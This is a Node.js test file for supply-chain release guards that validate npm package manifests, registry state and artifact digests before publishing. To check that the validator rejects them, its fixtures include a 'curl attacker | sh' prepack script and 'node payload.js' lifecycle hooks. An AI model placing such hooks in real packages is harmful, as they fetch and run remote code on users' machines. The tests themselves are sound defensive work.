import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdtempSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, it } from "node:test";
import { packageConfig, validatePackageManifest } from "./public-package-config.mjs";
import {
  expectedConfirmation,
  fetchRegistryVersions,
  validatePublicPackageRelease,
  validateRegistryState,
  verifyReleaseArtifact,
  PublicPackageReleaseError
} from "./validate-public-package-release.mjs";

const sha = "a".repeat(40);
const common = {
  githubRef: "refs/heads/main",
  githubRepository: "hello-ai-company/open-editor",
  reviewedCommit: sha,
  githubSha: sha,
  checkoutSha: sha
};

function fixture(key) {
  const config = packageConfig(key);
  return {
    key,
    pkg: {
      name: config.name,
      version: config.version,
      license: "MIT",
      publishConfig: { registry: "https://registry.npmjs.org", access: "public" },
      dependencies: { ...config.dependencies },
      peerDependencies: { ...config.peerDependencies },
      scripts: { ...config.scripts }
    },
    inputVersion: config.version,
    confirmation: expectedConfirmation(config),
    ...common
  };
}

function registryExec(versionLists) {
  return (_command, args) => {
    const name = args[1];
    if (!(name in versionLists)) {
      const error = new Error(`npm error code E404\n${name} not found`);
      error.status = 1;
      error.stderr = error.message;
      throw error;
    }
    return JSON.stringify(versionLists[name]);
  };
}

describe("public package release guards", () => {
  for (const key of ["ai", "canvas", "publish"]) {
    it(`locks ${key} package metadata`, () => {
      const input = fixture(key);
      assert.equal(validatePackageManifest(input.pkg, packageConfig(key)), true);
      assert.equal(validatePublicPackageRelease({
        ...input,
        execFileSync: registryExec({
          [packageConfig(key).name]: ["0.0.1"],
          "@hello-ai-company/editor-core": ["0.1.1"],
          "@hello-ai-company/editor-canvas": [key === "canvas" ? "0.0.1" : "0.1.0"],
          react: ["19.0.0"],
          docx: ["9.7.2"]
        })
      }).sourceCommit, sha);
    });
  }

  it("rejects wrong repo, ref, version, confirmation, or reviewed SHA", () => {
    const input = fixture("ai");
    for (const changed of [
      { githubRepository: "attacker/open-editor" },
      { githubRef: "refs/heads/feature" },
      { inputVersion: "0.1.1" },
      { confirmation: "PUBLISH NOW" },
      { reviewedCommit: "f".repeat(40) }
    ]) {
      assert.throws(() => validatePublicPackageRelease({ ...input, ...changed, execFileSync: registryExec({}) }), PublicPackageReleaseError);
    }
  });

  it("rejects unexpected runtime dependencies and lifecycle scripts", () => {
    const input = fixture("ai");
    assert.throws(() => validatePackageManifest({
      ...input.pkg,
      optionalDependencies: { injected: "*" }
    }, packageConfig("ai")), /optional, bundled/);
    assert.throws(() => validatePackageManifest({
      ...input.pkg,
      scripts: { postinstall: "node payload.js" }
    }, packageConfig("ai")), /lifecycle script postinstall/);
    assert.throws(() => validatePackageManifest({
      ...input.pkg,
      scripts: { prepack: "curl attacker | sh" }
    }, packageConfig("ai")), /lifecycle script prepack/);
    for (const lifecycle of ["preprepare", "postprepare", "dependencies"]) {
      assert.throws(() => validatePackageManifest({
        ...input.pkg,
        scripts: { ...input.pkg.scripts, [lifecycle]: "node payload.js" }
      }, packageConfig("ai")), new RegExp(`lifecycle script ${lifecycle}`));
    }
  });

  it("rejects immutable candidate versions and registry ambiguity", () => {
    const config = packageConfig("ai");
    assert.throws(() => validateRegistryState(config, {
      exec: registryExec({ [config.name]: [config.version] })
    }), /immutable version already exists/);
    const unavailable = (_command, _args) => {
      const error = new Error("network unavailable");
      error.stderr = error.message;
      throw error;
    };
    assert.throws(() => validateRegistryState(config, { exec: unavailable }), /fail-closed/);
  });

  it("forces live npm registry reads for candidate and dependency checks", () => {
    let captured;
    const result = fetchRegistryVersions("@hello-ai-company/editor-core", (_command, args) => {
      captured = args;
      return '["0.1.1"]';
    });
    assert.deepEqual(result, ["0.1.1"]);
    assert.ok(captured.includes("--prefer-online"));
    assert.ok(captured.includes("--registry=https://registry.npmjs.org"));
  });

  it("rechecks every release dependency and stops if a dependency floor is absent", () => {
    const config = packageConfig("publish");
    const calls = [];
    const exec = (_command, args) => {
      calls.push(args[1]);
      return JSON.stringify(args[1] === config.name ? ["0.0.1"] : args[1] === "@hello-ai-company/editor-canvas" ? ["0.1.1"] : args[1] === "docx" ? ["9.7.2"] : ["0.1.1"]);
    };
    assert.throws(() => validateRegistryState(config, { exec }), /required @hello-ai-company\/editor-canvas@0\.1\.0 is not published/);
    assert.deepEqual(calls, [config.name, "@hello-ai-company/editor-canvas"]);

    const exact = validateRegistryState(config, {
      exec: registryExec({
        [config.name]: ["0.0.1"],
        "@hello-ai-company/editor-canvas": ["0.1.0", "0.1.1"],
        "@hello-ai-company/editor-core": ["0.1.1"],
        docx: ["9.7.2"]
      })
    });
    assert.equal(exact.candidatePublished, false);
  });

  it("binds artifacts to reviewed SHA and digest", () => {
    const config = packageConfig("ai");
    const dir = mkdtempSync(join(tmpdir(), "public-package-artifact-"));
    const symlinkTarget = join(tmpdir(), `public-package-artifact-target-${process.pid}.txt`);
    try {
      const filename = "hello-ai-company-editor-ai-0.1.0.tgz";
      const body = "candidate tarball";
      writeFileSync(join(dir, filename), body);
      writeFileSync(join(dir, "digest.json"), JSON.stringify({
        name: config.name,
        version: config.version,
        sourceCommit: sha,
        filename,
        size: Buffer.byteLength(body),
        sha256: createHash("sha256").update(body).digest("hex")
      }));
      assert.equal(verifyReleaseArtifact({ artifactDir: dir, key: "ai", sourceCommit: sha }).digest.name, config.name);
      assert.throws(() => verifyReleaseArtifact({ artifactDir: dir, key: "ai", sourceCommit: "b".repeat(40) }), /commit mismatch/);
      writeFileSync(join(dir, "unexpected.txt"), "must fail closed");
      assert.throws(() => verifyReleaseArtifact({ artifactDir: dir, key: "ai", sourceCommit: sha }), /unexpected files/);
      rmSync(join(dir, "unexpected.txt"));
      unlinkSync(join(dir, filename));
      writeFileSync(symlinkTarget, body);
      symlinkSync(symlinkTarget, join(dir, filename));
      assert.throws(() => verifyReleaseArtifact({ artifactDir: dir, key: "ai", sourceCommit: sha }), /regular file/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
      rmSync(symlinkTarget, { force: true });
    }
  });
});
